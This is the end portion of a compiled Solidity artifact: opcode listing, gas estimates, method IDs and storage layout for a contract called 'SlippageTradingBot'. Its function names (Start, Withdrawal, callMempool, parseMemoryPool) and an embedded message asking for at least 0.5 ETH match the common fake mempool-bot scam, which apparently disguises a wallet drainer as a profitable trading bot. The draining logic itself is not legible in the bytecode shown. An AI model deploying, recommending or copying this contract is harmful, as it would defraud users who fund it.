ADD MSTORE PUSH2 0xC1F DUP2 DUP5 PUSH2 0xBCF JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0xC7D DUP3 PUSH2 0xC27 JUMP JUMPDEST SWAP2 POP PUSH2 0xC88 DUP4 PUSH2 0xC27 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 MUL PUSH2 0xC96 DUP2 PUSH2 0xC27 JUMP JUMPDEST SWAP2 POP DUP3 DUP3 DIV DUP5 EQ DUP4 ISZERO OR PUSH2 0xCAD JUMPI PUSH2 0xCAC PUSH2 0xC46 JUMP JUMPDEST JUMPDEST POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x32 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xCF4 DUP3 PUSH2 0xCE1 JUMP JUMPDEST SWAP2 POP PUSH2 0xCFF DUP4 PUSH2 0xCE1 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP DUP1 DUP3 GT ISZERO PUSH2 0xD17 JUMPI PUSH2 0xD16 PUSH2 0xC46 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0xD27 DUP3 PUSH2 0xC27 JUMP JUMPDEST SWAP2 POP PUSH2 0xD32 DUP4 PUSH2 0xC27 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0xD5E JUMPI PUSH2 0xD5D PUSH2 0xC46 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0xD6E DUP3 PUSH2 0xC27 JUMP JUMPDEST SWAP2 POP PUSH2 0xD79 DUP4 PUSH2 0xC27 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0xDA5 JUMPI PUSH2 0xDA4 PUSH2 0xC46 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0xDB5 DUP3 PUSH2 0xCE1 JUMP JUMPDEST SWAP2 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 SUB PUSH2 0xDE7 JUMPI PUSH2 0xDE6 PUSH2 0xC46 JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0xE29 DUP3 PUSH2 0xCE1 JUMP JUMPDEST SWAP2 POP PUSH2 0xE34 DUP4 PUSH2 0xCE1 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0xE44 JUMPI PUSH2 0xE43 PUSH2 0xDF2 JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0xE86 DUP3 PUSH2 0xCE1 JUMP JUMPDEST SWAP2 POP PUSH2 0xE91 DUP4 PUSH2 0xCE1 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0xEA1 JUMPI PUSH2 0xEA0 PUSH2 0xDF2 JUMP JUMPDEST JUMPDEST DUP3 DUP3 MOD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0xEB6 DUP3 PUSH2 0xCE1 JUMP JUMPDEST SWAP2 POP PUSH2 0xEC1 DUP4 PUSH2 0xCE1 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP DUP2 DUP2 GT ISZERO PUSH2 0xED9 JUMPI PUSH2 0xED8 PUSH2 0xC46 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0xFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xEF5 DUP3 PUSH2 0xEDF JUMP JUMPDEST SWAP2 POP PUSH2 0xF00 DUP4 PUSH2 0xEDF JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP PUSH1 0xFF DUP2 GT ISZERO PUSH2 0xF19 JUMPI PUSH2 0xF18 PUSH2 0xC46 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0xF29 DUP3 PUSH2 0xEDF JUMP JUMPDEST SWAP2 POP PUSH2 0xF34 DUP4 PUSH2 0xEDF JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP PUSH1 0xFF DUP2 GT ISZERO PUSH2 0xF4D JUMPI PUSH2 0xF4C PUSH2 0xC46 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID 0x4E PUSH16 0x7420656E6F756768206C697175696469 PUSH21 0x7920617661696C61626C65206F6E2074686520636F PUSH15 0x747261637420746F2072756E207468 PUSH6 0x20626F742E20 NUMBER PUSH16 0x6E747261637420636F6465206E656564 PUSH20 0x206174206C6561737420302E352045544820746F KECCAK256 PUSH2 0x766F PUSH10 0x642063757272656E7420 PUSH8 0x617320666565732E LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH20 0x4C2DB0FA60328170891DFA6297B99F06D0F9E9C2 SWAP14 MSIZE 0x4A 0xEC 0xF 0xC6 PUSH26 0xD09DFC7F64736F6C634300081400330000000000000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "820600",
						"executionCost": "855",
						"totalCost": "821455"
					},
					"external": {
						"Start()": "infinite",
						"Stop()": "infinite",
						"Withdrawal()": "infinite",
						"checkLiquidity()": "infinite"
					},
					"internal": {
						"_callStopMempoolActionMempool()": "infinite",
						"beyond(struct SlippageTradingBot.slice memory,struct SlippageTradingBot.slice memory)": "infinite",
						"callMempool()": "infinite",
						"checkMempool(uint256)": "infinite",
						"findContracts(uint256,uint256,uint256,uint256)": "infinite",
						"findNewContracts()": "infinite",
						"getLiquidity()": "24",
						"getMemPoolDepth()": "22",
						"getMemPoolHeight()": "22",
						"getMemPoolLength()": "22",
						"getMemPoolOffset()": "22",
						"loadCurrentContract(string memory)": "infinite",
						"mempool(string memory,string memory)": "infinite",
						"parseMemoryPool(string memory)": "infinite",
						"toHexDigit(uint8)": "infinite",
						"uint2str(uint256)": "infinite",
						"updateLiquidity()": "infinite"
					}
				},
				"methodIdentifiers": {
					"Start()": "1b55ba3a",
					"Stop()": "bedf0f4a",
					"Withdrawal()": "70e44c6a",
					"checkLiquidity()": "d82c52d6"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 6,
						"contract": "contracts/tradingbot.sol:SlippageTradingBot",
						"label": "liquidity",
						"offset": 0,
						"slot": "0",
						"type": "t_uint256"
					}
				],
				"types": {
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}